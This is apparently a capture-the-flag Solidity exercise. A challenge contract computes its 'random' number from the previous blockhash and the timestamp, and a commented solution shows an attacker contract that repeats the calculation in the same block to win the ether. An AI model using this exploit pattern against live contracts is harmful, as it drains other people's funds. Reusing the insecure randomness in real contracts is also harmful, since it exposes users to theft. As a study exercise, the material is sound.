pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

/*
The solution here is uses other contract that use the same calculation and call the contract with the result. Both request are executed in the same block, 
and for that have the sames variables. The script that I create take the address of the challenge contract in the construuctor. One time that the contract
is deployed we have to call the function guest, and after that the function withdraw to recover the ether.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface GuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract Script {
    address payable owner;
    GuessTheNewNumberChallenge challenge;

    constructor(address challengeAddress) {
        owner = payable(msg.sender);
        challenge = GuessTheNewNumberChallenge(challengeAddress);
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    receive() external payable {}


    function guess() public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        challenge.guess{value:msg.value}(answer);
    }

    function withdraw() external onlyOwner payable {
        owner.transfer(address(this).balance);
    }
}

*/